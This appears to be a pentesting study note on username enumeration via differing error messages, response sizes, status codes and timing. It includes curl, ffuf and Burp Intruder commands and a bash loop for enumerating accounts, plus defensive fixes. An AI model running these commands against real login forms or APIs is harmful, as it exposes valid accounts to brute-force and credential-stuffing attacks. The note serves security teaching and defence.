---
tags: [vapt, authentication, beginner]
difficulty: beginner
module: "16 - Authentication"
topic: "16.01 Username Enumeration (error messages, timing)"
portswigger_labs: ["Username enumeration via different responses", "Username enumeration via subtly different responses", "Username enumeration via response timing"]
---

# 16.01 — Username Enumeration

## What Is Username Enumeration?

```
PROBLEM:
  Login forms often reveal whether a USERNAME exists
  even when the password is wrong!
  
  ATTACKER WORKFLOW:
  1. Try username "alice" → "Invalid password"   ← username EXISTS!
  2. Try username "bob"   → "User not found"     ← username DOESN'T EXIST
  3. Try username "carol" → "Invalid password"   ← username EXISTS!
  
  NOW ATTACKER KNOWS VALID USERNAMES → makes password attacks 100x faster!

WHERE IT APPEARS:
  - Login pages (different error messages)
  - Registration forms ("that email is already taken")
  - Forgot password ("we sent an email" vs "no account found")
  - API endpoints (/api/users/alice → 200 vs 404)
```

---

## Error Message Enumeration

```
EXPLICIT DIFFERENTIATION (easy to detect):
  Valid user + wrong pass:   "Incorrect password"
  Invalid user:              "User not found" / "No account with this email"
  
SUBTLE DIFFERENTIATION (harder to spot):
  Valid user:    "Invalid password."    (with period)
  Invalid user:  "Invalid password"     (no period!)
  → Looks identical until you diff the raw response!

RESPONSE SIZE DIFFERENCES:
  Valid user response:   1523 bytes
  Invalid user response: 1498 bytes
  → Check Content-Length in Burp Intruder!
  
HTTP STATUS CODE:
  Valid user:   302 Redirect (to "wrong password" page)
  Invalid user: 200 OK (error on same page)
```

---

## Timing-Based Enumeration

```
HOW IT WORKS:
  Server validates username FIRST, then password.
  
  Valid username:   Server looks up user (fast) → checks BCrypt hash
                    BCrypt is SLOW by design (100ms+)!
  Invalid username: Server returns early (can't check hash if no user)
                    Response in ~5ms!
  
  TIMING DIFFERENCE:
  Valid user:   200ms response
  Invalid user: 8ms response
  → Measurable even over the network!

WHY IT LEAKS:
  Bad fix: "We return early for invalid users to save CPU"
  Real fix: Always compute hash, even for invalid users (use dummy hash)
```

---

## Registration Form Enumeration

```http
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=alice&password=Test1234!

---

RESPONSE IF USERNAME EXISTS:
HTTP/1.1 400 Bad Request
{"error": "Username already taken"}

RESPONSE IF USERNAME FREE:
HTTP/1.1 200 OK
{"message": "Account created!"}

→ Enumerate valid usernames by trying to register them!
```

---

## Forgot Password Enumeration

```http
POST /forgot-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=alice@example.com

---

LEAKY RESPONSE (if email exists):
{"message": "Password reset email sent to alice@example.com"}

LEAKY RESPONSE (if email doesn't exist):
{"error": "No account found for that email address"}

GOOD RESPONSE (non-leaking):
{"message": "If that email exists, we sent a reset link"}
→ Same response ALWAYS — attacker learns nothing!
```

---

## Exploiting Enumeration with Burp Intruder

```
STEP 1: Intercept login request
  POST /login
  username=§FUZZ§&password=wrongpassword

STEP 2: Burp Intruder → Sniper mode
  Payload: list of common usernames (SecLists has great lists)
  /usr/share/seclists/Usernames/Names/names.txt

STEP 3: Launch attack, sort by:
  - Response length (different length = different message)
  - Response code (200 vs 302)
  - "Grep - Match" for the error text that indicates success

STEP 4: Identify valid usernames from anomalies

SECLISTS WORDLISTS:
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

---

## Command Line Testing

```bash
# MANUAL TEST - compare response sizes:
curl -s -o /dev/null -w "%{size_download} %{time_total}\n" \
  -X POST https://target.com/login \
  -d "username=admin&password=wrongpass"

curl -s -o /dev/null -w "%{size_download} %{time_total}\n" \
  -X POST https://target.com/login \
  -d "username=doesnotexist999&password=wrongpass"

# If sizes differ → username enumeration via response length!
# If times differ (>50ms) → timing-based enumeration!

# AUTOMATE WITH FFUF:
ffuf -w /usr/share/seclists/Usernames/Names/names.txt:FUZZ \
  -X POST -u https://target.com/login \
  -d "username=FUZZ&password=wrongpass" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc 200 -fs 1498  # filter out size 1498 (invalid user size)
  # → Only shows responses with different size = valid usernames!
```

---

## API Endpoint Enumeration

```bash
# DIRECT USER LOOKUP:
# Many APIs return 200 for existing users, 404 for not found:
curl -s -o /dev/null -w "%{http_code}" https://api.target.com/users/alice
# → 200 = user exists

curl -s -o /dev/null -w "%{http_code}" https://api.target.com/users/nobody123
# → 404 = not found

# PROFILE PAGES:
# https://target.com/profile/alice → 200 = user exists
# https://target.com/profile/nobody123 → 404 = not found

# ENUMERATE:
for user in alice bob carol dave admin administrator root; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://api.target.com/users/$user")
    echo "$user: $code"
done
```

---

## Fix

```
DEFENSE:
  ✓ Use IDENTICAL error messages for all failed login attempts
    "Incorrect username or password" — never differentiate!
    
  ✓ Use identical response SIZES
    Add random padding if needed (Content-Length must match)
    
  ✓ Always compute password hash, even for invalid users
    Use a dummy hash: verify(password, DUMMY_BCRYPT_HASH) → false
    Prevents timing attacks!
    
  ✓ Forgot password: always return "if this email exists..."
  
  ✓ Registration: consider if username enumeration is acceptable
    Sometimes unavoidable (e.g., if usernames are public-facing)
    
  ✓ Rate limit + CAPTCHA after N failed attempts
```

---

## Related Notes
- [[02 - Password Brute Force]] — use enumerated usernames to brute force
- [[03 - Credential Stuffing]] — combine with leaked credential lists
- [[28 - Defense Rate Limiting Lockout MFA]] — mitigations
